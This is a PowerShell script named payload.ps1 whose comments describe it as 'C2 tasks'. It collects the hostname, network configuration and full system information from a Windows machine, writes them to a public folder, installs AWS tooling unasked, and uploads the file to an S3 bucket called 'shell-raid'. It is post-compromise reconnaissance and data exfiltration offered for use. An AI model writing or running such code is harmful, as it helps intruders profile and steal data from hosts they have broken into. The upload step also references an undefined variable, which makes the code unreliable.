# payload.ps1
# Write a message to the local system as a log
Write-Output "Executing C2 tasks on $(hostname)" | Out-File -FilePath "C:\Users\Public\c2_log.txt" -Append

# Task 1: Gather system information
$hostname = (hostname)
$ipconfig = (ipconfig /all | Out-String)
$systeminfo = (systeminfo | Out-String)

# Combine information into one variable and save it to a file
$info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
$info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"

# Upload the file to AWS S3
# Specify the bucket name and key (file name in S3)
$bucketName = "shell-raid"
$s3Key = "sysinfo-$(hostname)-$(Get-Date -Format 'yyyyMMddHHmmss').txt"

# Ensure AWS Tools for PowerShell is installed
if (-not (Get-Command -Name "Write-S3Object" -ErrorAction SilentlyContinue)) {
    Install-Module -Name "AWSPowerShell" -Force -Scope CurrentUser
}

# Upload the file to S3
try {
    Write-S3Object -BucketName $bucketName -Key $s3Key -File $infoFilePath -Region "ap-southeast-1"
    Write-Output "File uploaded successfully to S3: $bucketName/$s3Key"
} catch {
    Write-Output "Failed to upload file to S3. Error: $_"
}
